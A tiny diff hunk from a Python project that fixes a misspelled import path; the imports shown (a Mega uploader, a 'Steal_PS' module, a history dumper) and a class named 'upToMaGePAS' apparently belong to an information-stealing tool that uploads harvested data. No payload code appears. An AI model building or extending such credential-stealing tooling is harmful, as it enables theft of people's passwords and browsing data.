@@ -5,7 +5,7 @@
 from mega import Mega
 from os import chdir , remove  , getcwd , environ , walk , path
 from Steal_PS import Main
-from modules_virsion2.Moud.History import DumpHistory
+from modules_version2.Moud.History import DumpHistory
 
 class upToMaGePAS:
 	def __init__(self):
